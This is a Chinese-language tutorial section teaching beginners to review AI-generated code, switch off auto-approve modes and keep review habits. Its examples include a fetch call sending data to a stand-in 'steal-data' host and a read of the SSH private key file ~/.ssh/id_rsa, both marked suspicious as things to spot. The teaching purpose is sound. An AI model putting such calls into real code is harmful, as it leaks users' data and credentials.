# 5.3.6 永遠審查代碼：最重要的安全習慣

經過本節學習，你將瞭解：
- 爲什麼代碼審查如此重要
- 如何審查你不完全理解的代碼
- 關於"自動批准模式"的建議
- 建立可持續的審查習慣

## 令人擔憂的數據

根據 2025 年的開發者調查：

- 只有 **67%** 的開發者在部署前審查代碼
- 超過 **40%** 的初學者承認部署了不完全理解的 AI 生成代碼
- **33%** 的開發者表示會直接複製粘貼 AI 生成的代碼

這意味着：很多人正在使用他們並不真正理解的代碼。

## 什麼是"真正的"Vibe Coding？

Simon Willison（AI 領域知名專家、Django 核心貢獻者）對此有一個有趣的觀點：

> "如果 AI 寫了所有代碼，但你審查、測試並理解了它，那不是 Vibe Coding——那是用 AI 當打字助手。"

換句話說：

| 做法 | 類型 | 風險 |
|------|------|------|
| AI 生成 → 審查 → 測試 → 部署 | 用 AI 輔助開發 | 較低 |
| AI 生成 → 直接部署 | 純 Vibe Coding | 較高 |

我們在本教程中倡導的是**有意識的 AI 輔助開發**：充分利用 AI 的能力，但保持人類的判斷和審查。

## 如何審查你不完全理解的代碼

你可能會想：我是初學者，根本看不懂代碼，怎麼審查？

好消息是：你不需要完全理解每一行代碼，就可以進行有意義的審查。

### 檢查項一：敏感信息

即使不懂代碼，你也能識別這些模式：

```javascript
// 問自己：這裏有沒有看起來像密鑰的東西？
const key = "sk-abc123..."  // 這看起來像密鑰
const key = process.env.KEY  // 這是正確的方式
```

### 檢查項二：可疑的網絡請求

留意代碼是否在向你不認識的地址發送數據：

```javascript
// 問自己：這個網址是我知道的服務嗎？
fetch("https://api.openai.com/...")  // 正常，OpenAI 官方
fetch("https://random-site.xyz/steal-data")  // 可疑
```

### 檢查項三：文件操作

注意代碼是否在讀寫文件，特別是敏感路徑：

```javascript
// 問自己：爲什麼要讀取這些文件？
fs.readFile("~/.ssh/id_rsa")  // 危險！在讀取 SSH 私鑰
fs.readFile("./data.json")    // 正常，讀取項目內的數據
```

### 檢查項四：讓 AI 幫你審查

你可以讓另一個 AI（或同一個 AI）來檢查代碼：

```
請審查以下代碼，檢查是否有：
1. 硬編碼的密鑰或密碼
2. 可疑的網絡請求
3. 不安全的文件操作
4. 其他安全隱患

[粘貼代碼]
```

::: tip 技巧
用一個 AI 來審查另一個 AI 的代碼，可以發現一些明顯的問題。但這不能替代你自己的判斷。
:::

## 關閉自動批准模式

一些 AI IDE 提供了"自動批准"或"Yolo 模式"，允許 AI 不經你確認就執行命令或修改文件。

**初學者應該關閉此功能。**

原因：
1. 你需要看到 AI 在做什麼，才能學習
2. AI 可能做出你不想要的更改
3. 如果出錯，你無法及時阻止

每個操作都手動確認，雖然慢一點，但更安全，也能幫助你理解發生了什麼。

## 建立可持續的審查習慣

代碼審查不需要花很多時間。建立以下習慣：

**每次 AI 生成代碼後**：
- [ ] 快速掃一眼，有沒有看起來像密鑰的字符串
- [ ] 如果有網絡請求，確認目標地址是你知道的
- [ ] 如果看不懂某段代碼在做什麼，問 AI 解釋

**每次準備提交/部署前**：
- [ ] 運行安全檢查清單（5.3.4 節）
- [ ] 確認 .env 文件沒有被包含

**定期回顧**：
- [ ] 檢查項目依賴是否需要更新
- [ ] 確認沒有新的安全警告

## 記住這個原則

::: warning 核心原則
**AI 生成的代碼，最終責任在你。**

這不是爲了嚇你，而是提醒你：保持審查習慣，是保護自己的最好方式。
:::
